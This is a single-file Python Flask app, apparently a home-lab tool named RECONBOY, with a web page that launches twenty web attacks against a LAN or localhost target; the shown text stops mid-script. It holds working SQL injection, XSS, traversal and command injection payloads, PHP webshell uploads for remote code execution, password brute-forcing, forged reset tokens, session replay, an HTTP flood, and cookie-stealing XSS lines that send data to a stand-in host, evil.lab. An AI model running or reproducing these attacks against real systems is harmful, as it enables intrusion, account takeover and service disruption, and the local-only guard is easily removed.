#!/usr/bin/env python3
"""
RECONBOY — Local Network Attack Lab (Web UI)
Single-file Flask app. No dashboard/detection-engine dependency.
Type a target, pick intensity, hit Attack, watch results stream live.

SAFETY: Refuses to run against anything that isn't localhost or a
private/local-network address (RFC1918 / loopback). Attacks only
machines YOU own on YOUR own network.

Run:
  pip install flask requests --break-system-packages
  python3 reconboy.py
  open http://127.0.0.1:9090
"""
import re, os, time, hashlib, threading, urllib.parse, socket, ipaddress
import queue, uuid
from datetime import datetime

try:
    import requests
    from flask import Flask, request, jsonify, Response
except ImportError:
    print("Missing deps. Run: pip install flask requests --break-system-packages")
    raise SystemExit(1)

app = Flask(__name__)

# ── Global scan state (single active scan at a time) ───────────────
SCAN_LOCK = threading.Lock()
SCAN_STATE = {
    "running": False,
    "target": None,
    "intensity": None,
    "log": [],           # list of {type, text, ts}
    "findings": [],
    "results": [],
    "start_time": None,
    "stop_event": None,
    "scan_id": None,
}

# ── Safety guard: local network / localhost only ──────────────────
def is_local_target(url):
    try:
        host = urllib.parse.urlparse(url).hostname
        if not host:
            return False
        if host in ('localhost', '127.0.0.1', '::1'):
            return True
        ip = socket.gethostbyname(host)
        addr = ipaddress.ip_address(ip)
        return addr.is_private or addr.is_loopback
    except Exception:
        return False

# ── Embedded payloads ───────────────────────────────────────────────
PAYLOADS = {
    'sqli': [
        "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "admin' --",
        "admin' #", "' OR 1=1 --", "') OR ('1'='1", "1' OR '1'='1",
        "' UNION SELECT 1,2,3,4,5,6 --",
        "' UNION SELECT id,username,password,email,role,secret FROM users --",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL --",
        "1' UNION SELECT username,password FROM users --",
        "' OR 'a'='a", "\" OR \"1\"=\"1", "' OR SLEEP(0)='0",
        "admin'-- -", "' OR EXISTS(SELECT 1 FROM users) --",
        "'; DROP TABLE users; --", "1; SELECT * FROM users",
        "' AND 1=CONVERT(int,(SELECT @@version)) --",
    ],
    'xss': [
        "<script>alert(1)</script>", "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
        "\"><script>alert(1)</script>", "'><script>alert(1)</script>",
        "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>",
        "<input onfocus=alert(1) autofocus>", "javascript:alert(1)",
        "<details open ontoggle=alert(1)>", "<marquee onstart=alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
        "<script>document.location='http://evil.lab/'+document.cookie</script>",
        "<img src=x onerror=fetch('http://evil.lab?c='+document.cookie)>",
    ],
    'traversal': [
        "../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd", "C:\\windows\\win.ini",
        "..\\..\\..\\boot.ini", "/etc/shadow", "../../../../../../etc/passwd%00",
        "....\\\\....\\\\....\\\\windows\\\\win.ini",
    ],
    'cmdi': [
        "; id", "| id", "&& id", "`id`", "$(id)", "; whoami", "| whoami",
        "&& whoami", "; uname -a", "| uname -a", "; cat /etc/passwd",
        "127.0.0.1; id", "127.0.0.1 && id", "127.0.0.1 | id",
        "127.0.0.1`id`", "127.0.0.1$(id)",
    ],
    'passwords_l1': ["admin", "password", "123456", "admin123", "root"],
    'passwords_l2': ["admin", "password", "123456", "admin123", "root",
                      "toor", "letmein", "welcome", "password1", "qwerty",
                      "admin1", "changeme", "test123", "P@ssw0rd", "12345678",
                      "administrator", "guest", "secret", "default", "pass123"],
    'passwords_l3': ["admin", "password", "123456", "admin123", "root",
                      "toor", "letmein", "welcome", "password1", "qwerty",
                      "admin1", "changeme", "test123", "P@ssw0rd", "12345678",
                      "administrator", "guest", "secret", "default", "pass123",
                      "iloveyou", "monkey", "dragon", "master", "shadow",
                      "football", "baseball", "superman", "trustno1", "sunshine",
                      "princess", "flower", "hottie", "loveme", "abc123",
                      "1234567890", "password123", "qazwsx", "michael", "jennifer"],
}

def get_payloads(name, intensity):
    limits = {1: 5, 2: 20, 3: None}
    lst = PAYLOADS.get(name, [])
    limit = limits[intensity]
    return lst[:limit] if limit else lst

def get_passwords(intensity):
    key = {1: 'passwords_l1', 2: 'passwords_l2', 3: 'passwords_l3'}[intensity]
    return PAYLOADS[key]

INTENSITY_CONFIG = {
    1: {'name': 'QUICK', 'timeout': 1, 'delay': 0.05},
    2: {'name': 'STANDARD', 'timeout': 3, 'delay': 0.1},
    3: {'name': 'DEEP', 'timeout': 6, 'delay': 0.05},
}

# ── Logging helpers (push into SCAN_STATE log instead of print) ────
def log(kind, text):
    entry = {"type": kind, "text": text, "ts": datetime.now().strftime('%H:%M:%S')}
    SCAN_STATE["log"].append(entry)

def hdr(n, total, name, cat):
    elapsed = time.time() - SCAN_STATE["start_time"] if SCAN_STATE["start_time"] else 0
    log("header", f"[{n:02d}/{total}] {name}  [{cat}]  ({elapsed:.1f}s)")

def ok(m):   log("hit", m)
def warn(m): log("partial", m)
def info(m): log("info", m)
def skip(m): log("skip", m)
def err(m):  log("error", m)

def record(n, name, cat, status, detail, severity='LOW'):
    SCAN_STATE["results"].append({'num': n, 'name': name, 'category': cat,
                                   'status': status, 'detail': detail, 'severity': severity})
    if status == 'CONFIRMED':
        SCAN_STATE["findings"].append({'name': name, 'category': cat,
                                        'severity': severity, 'detail': detail})

def req(method, url, intensity, **kw):
    cfg = INTENSITY_CONFIG[intensity]
    kw.setdefault('timeout', cfg['timeout'])
    kw.setdefault('allow_redirects', True)
    if SCAN_STATE["stop_event"] and SCAN_STATE["stop_event"].is_set():
        return None
    try:
        return getattr(requests, method)(url, **kw)
    except requests.exceptions.RequestException:
        return None

def check_target(target, intensity):
    log("info", f"Checking target {target}...")
    r = req('get', target, intensity)
    if r and r.status_code < 500:
        log("info", f"Target UP — HTTP {r.status_code}")
        return True
    log("error", "Target unreachable!")
    return False

# ── ATTACK FUNCTIONS (target/intensity passed explicitly) ──────────

def a01_sqli_login(n, total, T, I):
    hdr(n, total, "SQL Injection — Login Bypass", "SQL INJECTION")
    for pl in get_payloads('sqli', I):
        if SCAN_STATE["stop_event"].is_set(): break
        r = req('post', f"{T}/login", I, data={"username": pl, "password": "x"})
        if r and ('dashboard' in r.url or ('Welcome' in r.text and '/login' not in r.url)):
            ok(f"SQLi login bypass CONFIRMED! payload={pl!r}")
            record(n, "SQLi Login Bypass", "SQL_INJECTION", "CONFIRMED", pl, 'CRITICAL')
            return
    warn("SQLi login payloads delivered — no confirmed bypass")
    record(n, "SQLi Login Bypass", "SQL_INJECTION", "TESTED", "payloads sent")

def a02_sqli_union(n, total, T, I):
    hdr(n, total, "SQL Injection — UNION SELECT Data Dump", "SQL INJECTION")
    payloads = [p for p in get_payloads('sqli', I) if 'union' in p.lower()]
    for pl in payloads:
        r = req('get', f"{T}/search", I, params={"q": pl})
        if r:
            cells = re.findall(r'<td>([^<]{1,80})</td>', r.text)
            if cells or 'FLAG{' in r.text or 'admin' in r.text:
                ok("UNION SELECT confirmed — data extracted!")
                record(n, "SQLi UNION SELECT", "SQL_INJECTION", "CONFIRMED", pl, 'CRITICAL')
                return
    warn("UNION payloads sent")
    record(n, "SQLi UNION SELECT", "SQL_INJECTION", "TESTED", "payloads sent")

def a03_sqli_blind(n, total, T, I):
    hdr(n, total, "SQL Injection — Boolean Blind", "SQL INJECTION")
    if I == 1:
        skip("Skipped in Quick mode")
        record(n, "SQLi Boolean Blind", "SQL_INJECTION", "SKIPPED", "")
        return
    rt = req('post', f"{T}/login", I, data={"username": "admin' AND '1'='1", "password": "x"})
    rf = req('post', f"{T}/login", I, data={"username": "admin' AND '1'='2", "password": "x"})
    if rt and rf:
        diff = abs(len(rt.text) - len(rf.text))
        info(f"TRUE size: {len(rt.text)} | FALSE size: {len(rf.text)} | diff: {diff}")
        if diff > 10:
            ok(f"Boolean blind SQLi CONFIRMED — {diff} byte difference!")
            record(n, "SQLi Boolean Blind", "SQL_INJECTION", "CONFIRMED", f"diff={diff}b", 'HIGH')
            return
    warn("Low differential — may not be exploitable")
    record(n, "SQLi Boolean Blind", "SQL_INJECTION", "TESTED", "")

def a04_sqli_time(n, total, T, I):
    hdr(n, total, "SQL Injection — Time-Based Blind", "SQL INJECTION")
    if I == 1:
        skip("Skipped in Quick mode")
        record(n, "SQLi Time-Based", "SQL_INJECTION", "SKIPPED", "")
        return
    sleep_s = 3 if I >= 2 else 1
    payloads = [f"' AND SLEEP({sleep_s}) --", f"'; WAITFOR DELAY '0:0:{sleep_s}' --",
                f"' AND (SELECT * FROM (SELECT(SLEEP({sleep_s})))a) --"]
    for pl in payloads:
        t0 = time.time()
        req('post', f"{T}/login", I, data={"username": pl, "password": "x"}, timeout=sleep_s + 4)
        el = time.time() - t0
        info(f"Elapsed: {el:.2f}s")
        if el >= sleep_s - 0.5:
            ok(f"Time-based blind CONFIRMED — {el:.2f}s delay!")
            record(n, "SQLi Time-Based", "SQL_INJECTION", "CONFIRMED", f"delay={el:.2f}s", 'HIGH')
            return
    warn("No significant delay detected")
    record(n, "SQLi Time-Based", "SQL_INJECTION", "TESTED", "")

def a05_xss_reflected(n, total, T, I):
    hdr(n, total, "XSS — Reflected", "XSS")
    payloads = get_payloads('xss', I)
    for ep, param in [('/search', 'q'), ('/ping', 'host'), ('/files', 'name')]:
        for pl in payloads:
            if SCAN_STATE["stop_event"].is_set(): break
            r = req('get', f"{T}{ep}", I, params={param: pl})
            if r and pl in r.text:
                ok(f"Reflected XSS CONFIRMED on {ep}?{param}=")
                record(n, "XSS Reflected", "XSS", "CONFIRMED", f"{ep} param={param}", 'CRITICAL')
                return
    warn("XSS payloads delivered")
    record(n, "XSS Reflected", "XSS", "TESTED", "payloads sent")

def a06_xss_stored(n, total, T, I):
    hdr(n, total, "XSS — Stored", "XSS")
    for pl in get_payloads('xss', I)[:5]:
        r = req('post', f"{T}/comments", I, data={"body": pl})
        if r:
            r2 = req('get', f"{T}/comments", I)
            if r2 and pl in r2.text:
                ok("Stored XSS CONFIRMED in /comments!")
                record(n, "XSS Stored", "XSS", "CONFIRMED", "/comments", 'CRITICAL')
                return
    warn("Stored XSS payloads sent")
    record(n, "XSS Stored", "XSS", "TESTED", "")

def a07_traversal(n, total, T, I):
    hdr(n, total, "Directory Traversal", "DIR TRAVERSAL")
    payloads = get_payloads('traversal', I)
    for ep, param in [('/files', 'name'), ('/upload', 'file'), ('/ping', 'host')]:
        for pl in payloads:
            if SCAN_STATE["stop_event"].is_set(): break
            r = req('get', f"{T}{ep}", I, params={param: pl})
            if r and any(x in r.text for x in ['root:', 'bin/bash', 'bin/sh', '[boot loader]', '[fonts]']):
                ok(f"Directory traversal CONFIRMED on {ep}! File: {pl}")
                record(n, "Dir Traversal", "DIR_TRAVERSAL", "CONFIRMED", f"{ep} {pl}", 'CRITICAL')
                return
    warn("Traversal payloads delivered")
    record(n, "Dir Traversal", "DIR_TRAVERSAL", "TESTED", "payloads sent")

def a08_cmdi(n, total, T, I):
    hdr(n, total, "Command Injection", "CMD INJECTION")
    indicators = ['uid=', 'root', 'www-data', 'daemon', 'Linux', 'GNU', '/bin', '/usr', 'runner']
    for pl in get_payloads('cmdi', I):
        if SCAN_STATE["stop_event"].is_set(): break
        r = req('get', f"{T}/ping", I, params={"host": pl})
        if r and any(x in r.text for x in indicators):
            ok(f"Command injection CONFIRMED! payload={pl!r}")
            record(n, "CMD Injection", "CMD_INJECTION", "CONFIRMED", pl, 'CRITICAL')
            return
    warn("CMD payloads delivered")
    record(n, "CMD Injection", "CMD_INJECTION", "TESTED", "payloads sent")

def a09_blind_cmdi(n, total, T, I):
    hdr(n, total, "Command Injection — Blind (timing)", "CMD INJECTION")
    if I == 1:
        skip("Skipped in Quick mode")
        record(n, "Blind CMDi", "CMD_INJECTION", "SKIPPED", "")
        return
    sleep_s = 3 if I >= 2 else 1
    t0 = time.time(); req('get', f"{T}/ping", I, params={"host": "127.0.0.1"}, timeout=8)
    baseline = time.time() - t0
    t0 = time.time(); req('get', f"{T}/ping", I, params={"host": f"127.0.0.1; sleep {sleep_s}"}, timeout=15)
    elapsed = time.time() - t0
    delta = elapsed - baseline
    info(f"Baseline: {baseline:.2f}s | Injected: {elapsed:.2f}s | Delta: {delta:.2f}s")
    if delta >= sleep_s - 0.8:
        ok(f"Blind CMDi CONFIRMED — {delta:.2f}s delay!")
        record(n, "Blind CMDi", "CMD_INJECTION", "CONFIRMED", f"delta={delta:.2f}s", 'CRITICAL')
    else:
        warn(f"Delta {delta:.2f}s insufficient")
        record(n, "Blind CMDi", "CMD_INJECTION", "TESTED", "")

def a10_upload_shell(n, total, T, I):
    hdr(n, total, "File Upload — PHP Webshell", "FILE UPLOAD")
    shell_code = b'<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>'
    r = req('post', f"{T}/upload", I, files={"file": ("shell.php", shell_code, "application/octet-stream")})
    if r and ('Uploaded' in r.text or 'shell.php' in r.text):
        ok("Webshell uploaded!")
        for cmd in ['id', 'whoami', 'uname -a']:
            er = req('get', f"{T}/uploads/shell.php", I, params={"cmd": cmd})
            if er and any(x in er.text for x in ['uid=', 'root', 'Linux', 'www-data']):
                ok(f"RCE CONFIRMED! cmd={cmd}: {er.text.strip()[:100]}")
                record(n, "File Upload RCE", "FILE_UPLOAD", "CONFIRMED", f"cmd={cmd}", 'CRITICAL')
                return
        ok("Shell uploaded (needs PHP runtime for execution)")
        record(n, "File Upload", "FILE_UPLOAD", "CONFIRMED", "shell on disk", 'HIGH')
    else:
        warn("Upload blocked or endpoint not found")
        record(n, "File Upload", "FILE_UPLOAD", "TESTED", "")

def a11_upload_bypass(n, total, T, I):
    hdr(n, total, "File Upload — Extension & MIME Bypass", "FILE UPLOAD")
    if I == 1:
        skip("Skipped in Quick mode")
        record(n, "Upload Bypass", "FILE_UPLOAD", "SKIPPED", "")
        return
    cases = [
        ("shell.php.jpg", b'<?php system($_GET["c"]); ?>', "image/jpeg", "Double ext"),
        ("shell.pHp", b'<?php phpinfo(); ?>', "text/plain", "Case bypass"),
        ("shell.php5", b'<?php echo shell_exec("id");?>', "text/plain", "php5 ext"),
        ("shell.phtml", b'<?php passthru($_GET["cmd"]);?>', "text/html", "phtml"),
    ]
    found = []
    for fname, content, mime, label in cases:
        r = req('post', f"{T}/upload", I, files={"file": (fname, content, mime)})
        if r and ('Uploaded' in r.text or fname in r.text):
            ok(f"Bypass accepted: {label} — {fname}")
            found.append(label)
    if found:
        record(n, "Upload Bypass", "FILE_UPLOAD", "CONFIRMED", str(found), 'HIGH')
    else:
        warn("Upload bypass attempts delivered")
        record(n, "Upload Bypass", "FILE_UPLOAD", "TESTED", "")

def a12_idor(n, total, T, I):
    hdr(n, total, "IDOR — Insecure Direct Object Reference", "IDOR")
    flags = []
    for uid in range(1, 6):
        r = req('get', f"{T}/profile/{uid}", I)
        if r and r.status_code == 200:
            found = re.findall(r'FLAG\{[^}]+\}', r.text)
            if found:
                ok(f"uid={uid}: {found}")
                flags.extend(found)
            else:
                info(f"uid={uid}: profile accessible")
    r2 = req('get', f"{T}/api/users", I)
    if r2 and r2.status_code == 200:
        try:
            data = r2.json()
            ok(f"Unauthenticated API dump — {len(data)} users!")
        except Exception:
            pass
    if flags:
        record(n, "IDOR", "IDOR", "CONFIRMED", f"flags={flags}", 'HIGH')
    else:
        record(n, "IDOR", "IDOR", "TESTED", "profiles checked")

def a13_bruteforce(n, total, T, I):
    hdr(n, total, "Brute Force — Login", "BRUTE FORCE")
    passwords = get_passwords(I)
    usernames = ['admin', 'administrator', 'root', 'user', 'test']
    info(f"Trying {len(passwords)} passwords x {len(usernames)} usernames")
    for uname in usernames:
        for pw in passwords:
            if SCAN_STATE["stop_event"].is_set(): break
            r = req('post', f"{T}/login", I, data={"username": uname, "password": pw})
            if r and ('dashboard' in r.url or ('Welcome' in r.text and '/login' not in r.url)):
                ok(f"Credentials FOUND: {uname}:{pw}")
                record(n, "Brute Force", "BRUTE_FORCE", "CONFIRMED", f"{uname}:{pw}", 'HIGH')
                return
            time.sleep(INTENSITY_CONFIG[I]['delay'])
    warn(f"No credentials found in {len(passwords)} attempts")
    record(n, "Brute Force", "BRUTE_FORCE", "TESTED", f"{len(passwords)} tried")

def a14_csrf(n, total, T, I):
    hdr(n, total, "CSRF — Cross-Site Request Forgery", "CSRF")
    payload = "CSRF_TEST: Forged request from evil.lab"
    r = req('post', f"{T}/comments", I, data={"body": payload},
            headers={"Origin": "http://evil.lab", "Referer": "http://evil.lab/csrf.html"})
    if r:
        r2 = req('get', f"{T}/comments", I)
        if r2 and payload in r2.text:
            ok("CSRF CONFIRMED — cross-origin POST accepted!")
            record(n, "CSRF", "CSRF", "CONFIRMED", "forged POST accepted", 'MEDIUM')
        else:
            warn("CSRF request sent — no token validation detected")
            record(n, "CSRF", "CSRF", "TESTED", "")
    else:
        record(n, "CSRF", "CSRF", "TESTED", "")

def a15_ssti(n, total, T, I):
    hdr(n, total, "SSTI — Server Side Template Injection", "SSTI")
    probes = [('{{7*7}}', '49'), ("{{7*'7'}}", '7777777'), ('${7*7}', '49')]
    for ep, param in [('/search', 'q'), ('/ping', 'host'), ('/files', 'name')]:
        for probe, expected in probes:
            if SCAN_STATE["stop_event"].is_set(): break
            r = req('get', f"{T}{ep}", I, params={param: probe})
            if r and expected in r.text:
                ok(f"SSTI CONFIRMED on {ep}! {probe} = {expected}")
                record(n, "SSTI", "SSTI", "CONFIRMED", f"{ep} {probe}->{expected}", 'CRITICAL')
                return
    warn("SSTI probes delivered")
    record(n, "SSTI", "SSTI", "TESTED", "probes sent")

def a16_weak_reset(n, total, T, I):
    hdr(n, total, "Weak Password Reset Token", "AUTH BYPASS")
    for uname in ['admin', 'administrator', 'root', 'user', 'test']:
        token = hashlib.md5(uname.encode()).hexdigest()
        info(f"Forged token for '{uname}': MD5 = {token}")
        r = req('get', f"{T}/reset/{token}", I)
        if r and r.status_code == 200 and 'Password' in r.text:
            ok(f"Weak reset token CONFIRMED for user '{uname}'!")
            record(n, "Weak Reset Token", "AUTH_BYPASS", "CONFIRMED", f"user={uname}", 'CRITICAL')
            return
    warn("Reset token test complete")
    record(n, "Weak Reset Token", "AUTH_BYPASS", "TESTED", "")

def a17_recon(n, total, T, I):
    hdr(n, total, "Recon — Sensitive Endpoints & Info Disclosure", "RECON")
    l1 = ['/debug', '/api/users', '/.env', '/admin']
    l2 = l1 + ['/phpmyadmin', '/.git/config', '/server-status', '/actuator', '/config', '/backup']
    l3 = l2 + ['/wp-admin', '/wp-config.php', '/phpinfo.php', '/robots.txt', '/sitemap.xml',
               '/api/v1/users', '/swagger.json', '/graphql', '/console', '/health', '/metrics', '/status']
    endpoints = {1: l1, 2: l2, 3: l3}[I]
    found = []
    for ep in endpoints:
        if SCAN_STATE["stop_event"].is_set(): break
        r = req('get', f"{T}{ep}", I)
        status = r.status_code if r else 'ERR'
        if r and r.status_code == 200:
            ok(f"OPEN: {ep}  [{status}]")
            found.append(ep)
        else:
            info(f"  {ep} -> {status}")
    if found:
        record(n, "Info Disclosure", "RECON", "CONFIRMED", f"open={found}", 'MEDIUM')
    else:
        record(n, "Info Disclosure", "RECON", "TESTED", "no open endpoints found")

def a18_ssrf(n, total, T, I):
    hdr(n, total, "SSRF — Server Side Request Forgery", "SSRF")
    if I == 1:
        skip("Skipped in Quick mode")
        record(n, "SSRF", "SSRF", "SKIPPED", "")
        return
    for t in ['http://127.0.0.1:5001/health', 'http://localhost:8080/']:
        r = req('get', f"{T}/ping", I, params={"host": t},
                headers={"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"})
        if r:
            info(f"SSRF probe {t} -> HTTP {r.status_code}")
    record(n, "SSRF", "SSRF", "TESTED", "probes sent")

def a19_session(n, total, T, I):
    hdr(n, total, "Session Hijacking — Cookie Replay", "SESSION")
    s = requests.Session()
    try:
        s.post(f"{T}/login", data={"username": "admin' OR '1'='1' -- ", "password": "x"},
               timeout=5, allow_redirects=True)
        cookies = dict(s.cookies)
        if cookies:
            info(f"Captured: {cookies}")
            r2 = requests.get(f"{T}/dashboard", cookies=cookies, timeout=5)
            if r2 is not None and ('Welcome' in r2.text or 'admin' in r2.text.lower()):
                ok("Session hijack CONFIRMED!")
                record(n, "Session Hijack", "SESSION", "CONFIRMED", str(list(cookies.keys())), 'HIGH')
                return
        warn("No session cookie captured")
        record(n, "Session Hijack", "SESSION", "TESTED", "")
    except requests.exceptions.RequestException as e:
        warn(str(e))
        record(n, "Session Hijack", "SESSION", "TESTED", "")

def a20_dos(n, total, T, I):
    hdr(n, total, "DoS — HTTP Request Flood", "DOS")
    if I == 1:
        skip("Skipped in Quick mode")
        record(n, "DoS Flood", "DOS", "SKIPPED", "")
        return
    threads_count = {2: 10, 3: 20}[I]
    reqs_each = {2: 15, 3: 30}[I]
    info(f"{threads_count} threads x {reqs_each} requests = {threads_count*reqs_each} total")
    counter = {'sent': 0, 'errcount': 0}
    lock = threading.Lock()

    def flood():
        for _ in range(reqs_each):
            r = req('get', f"{T}/search", I, params={"q": "dos"})
            with lock:
                if r: counter['sent'] += 1
                else: counter['errcount'] += 1

    t0 = time.time()
    ts = [threading.Thread(target=flood) for _ in range(threads_count)]
    for t in ts: t.start()
    for t in ts: t.join()
    el = time.time() - t0
    rps = counter['sent'] / el if el > 0 else 0
    ok(f"Flood: {counter['sent']}/{threads_count*reqs_each} in {el:.2f}s ({rps:.0f} rps)")
    record(n, "DoS Flood", "DOS", "CONFIRMED", f"{counter['sent']} reqs", 'MEDIUM')

ALL_ATTACKS = [
    a01_sqli_login, a02_sqli_union, a03_sqli_blind, a04_sqli_time,
    a05_xss_reflected, a06_xss_stored,
    a07_traversal, a08_cmdi, a09_blind_cmdi,
    a10_upload_shell, a11_upload_bypass,
    a12_idor, a13_bruteforce, a14_csrf,
    a15_ssti, a16_weak_reset, a17_recon, a18_ssrf,
    a19_session, a20_dos,
]

def run_scan_thread(target, intensity):
    SCAN_STATE["running"] = True
    SCAN_STATE["target"] = target
    SCAN_STATE["intensity"] = intensity
    SCAN_STATE["log"] = []
    SCAN_STATE["findings"] = []
    SCAN_STATE["results"] = []
    SCAN_STATE["start_time"] = time.time()
    SCAN_STATE["stop_event"] = threading.Event()
    SCAN_STATE["scan_id"] = str(uuid.uuid4())[:8]

    log("banner", f"RECONBOY — attacking {target} — intensity {INTENSITY_CONFIG[intensity]['name']}")

    if not check_target(target, intensity):
        log("error", "Aborting — target unreachable")
        SCAN_STATE["running"] = False
        return

    total = len(ALL_ATTACKS)
    for i, fn in enumerate(ALL_ATTACKS, 1):
        if SCAN_STATE["stop_event"].is_set():
            log("info", "Scan stopped by user")
            break
        try:
            fn(i, total, target, intensity)
        except Exception as e:
            err(f"Attack #{i} ({fn.__name__}) crashed: {e}")
            record(i, fn.__name__, "ERROR", "ERROR", str(e))
        time.sleep(INTENSITY_CONFIG[intensity]['delay'])

    elapsed = time.time() - SCAN_STATE["start_time"]
    log("summary", f"DONE — {len(SCAN_STATE['results'])} attacks run, "
                    f"{len(SCAN_STATE['findings'])} confirmed, {elapsed:.1f}s")
    SCAN_STATE["running"] = False

# ── Routes ───────────────────────────────────────────────────────
@app.route('/')
def index():
    return HTML_PAGE

@app.route('/api/attack', methods=['POST'])
def api_attack():
    with SCAN_LOCK:
        if SCAN_STATE["running"]:
            return jsonify({"error": "A scan is already running"}), 409
        data = request.get_json(force=True)
        target = (data.get('target') or '').strip()
        intensity = int(data.get('intensity', 2))
        if intensity not in (1, 2, 3):
            return jsonify({"error": "Invalid intensity"}), 400
        if not target.startswith('http://') and not target.startswith('https://'):
            target = 'http://' + target
        if not is_local_target(target):
            return jsonify({"error": "Refused: target must be localhost or a private "
                                      "LAN address (10.x, 172.16-31.x, 192.168.x, 127.0.0.1)."}), 400
        t = threading.Thread(target=run_scan_thread, args=(target, intensity), daemon=True)
        t.start()
    return jsonify({"status": "started"})

@app.route('/api/stop', methods=['POST'])
def api_stop():
    if SCAN_STATE["stop_event"]:
        SCAN_STATE["stop_event"].set()
    return jsonify({"status": "stopping"})

@app.route('/api/status')
def api_status():
    return jsonify({
        "running": SCAN_STATE["running"],
        "target": SCAN_STATE["target"],
        "intensity": SCAN_STATE["intensity"],
        "log": SCAN_STATE["log"],
        "findings": SCAN_STATE["findings"],
        "results": SCAN_STATE["results"],
    })

# ── Frontend (single page, dark HackTheBox-style UI) ────────────────
HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>RECONBOY — Attack Lab</title>
<style>
  :root {
    --bg: #0b0e14; --panel: #111620; --border: #1f2937;
    --green: #39ff88; --red: #ff4757; --yellow: #ffc857;
    --blue: #58a6ff; --purple: #a970ff; --text: #c9d1d9; --dim: #6b7280;
  }
  * { box-sizing: border-box; }
  body {
    background: var(--bg); color: var(--text);
    font-family: 'Consolas', 'Courier New', monospace;
    margin: 0; padding: 24px;
  }
  h1 {
    color: var(--green); letter-spacing: 4px; font-size: 28px;
    margin: 0 0 4px 0; text-shadow: 0 0 12px rgba(57,255,136,0.4);
  }
  .subtitle { color: var(--dim); font-size: 13px; margin-bottom: 20px; }
  .panel {
    background: var(--panel); border: 1px solid var(--border);
    border-radius: 8px; padding: 18px; margin-bottom: 16px;
  }
  .controls { display: flex; gap: 12px; flex-wrap: wrap; align-items: end; }
  label { display: block; font-size: 11px; color: var(--dim); margin-bottom: 4px; text-transform: uppercase; }
  input, select {
    background: #0d1117; border: 1px solid var(--border); color: var(--text);
    padding: 9px 12px; border-radius: 5px; font-family: inherit; font-size: 13px;
  }
  input { width: 320px; }
  input:focus, select:focus { outline: none; border-color: var(--green); }
  button {
    background: var(--green); color: #04120a; border: none; padding: 10px 22px;
    border-radius: 5px; font-family: inherit; font-weight: bold; cursor: pointer;
    font-size: 13px; letter-spacing: 1px;
  }
  button:hover { filter: brightness(1.1); }
  button:disabled { background: var(--dim); cursor: not-allowed; }
  button.stop { background: var(--red); color: #fff; }
  .status-bar {
    display: flex; gap: 24px; margin-top: 14px; font-size: 12px; color: var(--dim);
  }
  .status-bar span b { color: var(--text); }
  #log {
    background: #05070b; border: 1px solid var(--border); border-radius: 6px;
    padding: 14px; height: 480px; overflow-y: auto; font-size: 12.5px; line-height: 1.6;
  }
  .l-header { color: var(--yellow); border-top: 1px solid var(--border); padding-top: 6px; margin-top: 6px; }
  .l-hit { color: var(--green); font-weight: bold; }
  .l-partial { color: var(--yellow); }
  .l-info { color: var(--blue); }
  .l-skip { color: var(--dim); }
  .l-error { color: var(--red); }
  .l-banner { color: var(--purple); font-weight: bold; }
  .l-summary { color: var(--green); font-weight: bold; border-top: 1px solid var(--border); padding-top: 8px; margin-top: 8px; }
  .ts { color: var(--dim); margin-right: 8px; }
  #findings { display: flex; flex-direction: column; gap: 6px; }
  .finding { padding: 8px 12px; border-radius: 5px; background: #1a0d0d; border-left: 3px solid var(--red); font-size: 12.5px; }
  .finding.HIGH { border-color: var(--yellow); background: #1a1608; }
  .finding.MEDIUM { border-color: var(--yellow); background: #1a1608; }
  .finding .sev { font-weight: bold; margin-right: 8px; }
  .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 10px; margin-left: 10px; }
  .badge.local { background: #0d2818; color: var(--green); border: 1px solid var(--green); }
  .empty { color: var(--dim); font-style: italic; }
</style>
</head>
<body>
  <h1>&gt; RECONBOY_</h1>
  <div class="subtitle">Local network attack lab — 20 attack modules — LAN/localhost only <span class="badge local">SAFE SCOPE ENFORCED</span></div>

  <div class="panel">
    <div class="controls">
      <div>
        <label>Target</label>
        <input id="target" placeholder="192.168.1.38:5500 or 127.0.0.1:5000" />
      </div>
      <div>
        <label>Intensity</label>
        <select id="intensity">
          <option value="1">1 — Quick (&lt;10s)</option>
          <option value="2" selected>2 — Standard (~1min)</option>
          <option value="3">3 — Deep (~10min)</option>
        </select>
      </div>
      <button id="attackBtn" onclick="startAttack()">▶ ATTACK</button>
      <button id="stopBtn" class="stop" onclick="stopAttack()" style="display:none">■ STOP</button>
    </div>
    <div class="status-bar">
      <span>Status: <b id="statusText">idle</b></span>
      <span>Attacks run: <b id="statAttacks">0</b></span>
      <span>Confirmed findings: <b id="statFindings">0</b></span>
    </div>
  </div>

  <div class="panel">
    <label style="margin-bottom:8px;">Live Output</label>
    <div id="log"><div class="empty">Set a target and hit ATTACK to begin...</div></div>
  </div>

  <div class="panel">
    <label style="margin-bottom:8px;">Confirmed Vulnerabilities</label>
    <div id="findings"><div class="empty">No findings yet</div></div>
  </div>

<script>
let polling = null;

function startAttack() {
  const target = document.getElementById('target').value.trim();
  const intensity = parseInt(document.getElementById('intensity').value);
  if (!target) { alert('Enter a target first'); return; }

  fetch('/api/attack', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({target, intensity})
  }).then(r => r.json()).then(data => {
    if (data.error) { alert(data.error); return; }
    document.getElementById('attackBtn').style.display = 'none';
    document.getElementById('stopBtn').style.display = 'inline-block';
    document.getElementById('log').innerHTML = '';
    document.getElementById('findings').innerHTML = '<div class="empty">No findings yet</div>';
    poll();
  }).catch(e => alert('Request failed: ' + e));
}

function stopAttack() {
  fetch('/api/stop', {method: 'POST'});
}

function poll() {
  if (polling) clearInterval(polling);
  polling = setInterval(() => {
    fetch('/api/status').then(r => r.json()).then(renderStatus);
  }, 800);
}

function renderStatus(s) {
  document.getElementById('statusText').textContent = s.running ? 'RUNNING' : 'idle';
  document.getElementById('statAttacks').textContent = s.results.length;
  document.getElementById('statFindings').textContent = s.findings.length;

  const logEl = document.getElementById('log');
  logEl.innerHTML = s.log.map(l =>
